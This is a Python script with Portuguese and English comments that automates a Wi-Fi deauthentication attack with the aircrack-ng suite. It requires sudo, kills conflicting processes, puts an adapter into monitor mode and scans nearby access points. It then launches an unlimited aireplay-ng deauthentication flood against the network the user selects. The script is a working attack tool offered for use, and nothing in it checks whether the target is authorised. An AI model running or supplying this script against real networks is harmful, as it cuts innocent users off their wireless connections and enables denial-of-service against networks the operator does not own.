import os
import sys
import time
import subprocess
import shutil
import re
import csv
from datetime import datetime

# Função para verificar se o ESSID já está na lista
# Function to check if the ESSID is already in the list
def check_for_essid(essid, lst):
    check_status = True

    # Se a lista estiver vazia, adiciona o ESSID
    # If the list is empty, add the ESSID
    if len(lst) == 0:
        return check_status

    # Verifica se o ESSID já está na lista
    # Check if the ESSID is already in the list
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Função de impressão com delay
# Function to print with delay
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)

# Limpa a tela
# Clear the screen
os.system("clear")		

# Exibição do cabeçalho personalizado com o seu nome
# Display the custom header with your name
print("""\033[92m
  [+]---------------------------------------------------------------------[+] 
   |  DDDD   III  EEEEE  GGGG   OOO     DDDD   OOO   SSSSS  EEEEE  SSSSS  |
   |  D   D   I   E      G       O   O   D   D O   O  S       E     S      |
   |  D   D   I   EEEE   G  GG   O   O   D   D O   O  SSSSS   EEEE  SSSSS  |
   |  D   D   I   E      G   G   O   O   D   D O   O      S   E         S   |
   |  DDDD   III  EEEEE  GGGG   OOO     DDDD   OOO   SSSSS   EEEEE  SSSSS  |
   |                                                                       |
   |        Brazil Goiania                                                 |
   |         github page : https://github.com/R3DHULK                      |
  [+]---------------------------------------------------------------------[+]
""")

# Verifica se o script está sendo executado com privilégios de super usuário
# Check if the script is being run with superuser privileges
if not 'SUDO_UID' in os.environ.keys():
    slowprint("\033[91m [!] Tente rodar este programa com sudo.")
    exit()

# Move todos os arquivos .csv para uma pasta de backup
# Move all .csv files to a backup folder
for file_name in os.listdir():
    if ".csv" in file_name:
        print("\033[93m [!] Não deveria haver arquivos .csv no diretório. Encontramos arquivos .csv.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            slowprint("\033[4m [+] A pasta de backup já existe.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex para encontrar interfaces de rede sem fio
# Regex to find wireless network interfaces
wlan_pattern = re.compile("^wlan[0-9]+")

# Captura as interfaces de rede sem fio disponíveis
# Get the available wireless network interfaces
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Verifica se há adaptadores Wi-Fi conectados
# Check if there are any Wi-Fi adapters connected
if len(check_wifi_result) == 0:
    slowprint("\033[91m [?] Por favor, conecte um adaptador WiFi e tente novamente.")
    exit()

# Exibe o menu para selecionar a interface Wi-Fi
# Display the menu to select the Wi-Fi interface
slowprint("\033[92m [+] As seguintes interfaces Wi-Fi estão disponíveis:")
for index, item in enumerate(check_wifi_result):
    print(f"  {index} - {item}")

# Garante que a interface Wi-Fi selecionada é válida
# Ensure the selected Wi-Fi interface is valid
while True:
    wifi_interface_choice = input("\033[96m Por favor, selecione a interface que você quer usar para o ataque: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("\033[91m [-] Por favor, insira um número válido.")

# Para referência fácil, chamamos a interface selecionada de 'hacknic'
# For easy reference, we call the selected interface 'hacknic'
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Mata processos de Wi-Fi conflitantes
# Kill conflicting Wi-Fi processes
slowprint("\033[91m [+] Adaptador WiFi conectado!\n [*] Agora vamos matar processos conflitantes:")

# Matando processos de Wi-Fi conflitantes
# Killing conflicting Wi-Fi processes
kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Coloca a interface Wi-Fi em modo monitor
# Put the Wi-Fi interface in monitor mode
slowprint("\033[91m [*] Colocando adaptador Wi-Fi em modo monitor:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Descobre os pontos de acesso
# Discover access points
slowprint("\033[91m [+] Buscando pontos de acesso...")
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop que exibe os pontos de acesso e aguarda a seleção do usuário
# Loop that displays access points and waits for user selection
try:
    active_wireless_networks = []
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("\033[91m [*] Scanning. Press Ctrl+C to select the network to attack.\n")
        print("\033[94m No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\033[92m\n [+] Pronto para fazer a escolha.")
    
# Garante que a escolha do usuário é válida
# Ensure that the user's selection is valid
while True:
    choice = input("\033[92m [+] Por favor, selecione uma escolha da lista acima: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("\033[91m [-] Por favor, tente novamente.")

# Atribui os resultados a variáveis para facilitar
# Assign the results to variables for easier reference
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Muda para o canal do ponto de acesso escolhido
# Switch to the channel of the selected access point
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Realiza o ataque de desautenticação
# Perform the deauthentication attack
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

slowprint("\033[94m <============ Press Ctrl + C to abort the attack ==============> ")
input(slowprint("\033[91m  Attack Potential Loaded. Press Enter To Continue  "))	

# Loop infinito para continuar o ataque até a interrupção
# Infinite loop to continue the attack until interruption
try:
    while True:
        print("\033[91m ********* Deautenticando clientes **********")
except KeyboardInterrupt:
    slowprint("\033[93m [-] Ataque interrompido ")
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    slowprint("\033[94m 😊😊😊 Obrigado! Saindo agora 😊😊😊")
time.sleep(2)
